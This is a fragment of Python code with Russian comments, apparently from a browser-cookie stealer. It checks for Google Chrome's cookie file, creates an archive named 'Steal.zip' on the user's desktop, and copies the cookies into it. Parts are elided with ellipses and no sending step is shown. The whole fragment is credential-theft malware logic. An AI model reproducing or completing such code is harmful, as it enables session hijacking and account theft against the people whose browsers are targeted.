...
def main():
 ...
 if (os.path.exists(GoogleChrome_Path)): # Проверка наличия Куки Google Chrome
  ...
  zip_file = zipfile.ZipFile(r'C:\\Users\\' + user_name + '\\Desktop\\Steal.zip', 'w') # Создаем новый C:\\Steal.zip
 
  zip_file.write(GoogleChrome_Cookies) # Помещаем куки файлы в архив
